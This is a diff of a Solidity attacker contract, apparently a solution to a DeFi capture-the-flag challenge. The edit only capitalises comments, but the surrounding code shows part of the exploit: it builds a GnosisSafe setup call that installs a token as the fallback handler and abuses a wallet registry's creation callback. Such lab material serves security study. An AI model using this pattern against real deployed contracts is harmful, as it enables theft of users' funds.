@@ -54,12 +54,12 @@ contract BackdoorAttacker {
                     GnosisSafe.setup.selector, // Function signature to call, must be setup()
                     owner, // Must be exactly one of the registered beneficiaries
                     1, // Threshold, must be 1
-                    address(0x0), // we don't care
-                    0x0, // we don't care
-                    address(token), // token address will be the handler address
-                    address(0x0), // we don't care
-                    0, // we don't care
-                    address(0x0) // we don't care
+                    address(0x0), // We don't care
+                    0x0, // We don't care
+                    address(token), // Token address will be the handler address
+                    address(0x0), // We don't care
+                    0, // We don't care
+                    address(0x0) // We don't care
                 ),
                 0, // We don't care
                 IProxyCreationCallback(walletRegistryAddress) // Registry has the callback we want to exploit);
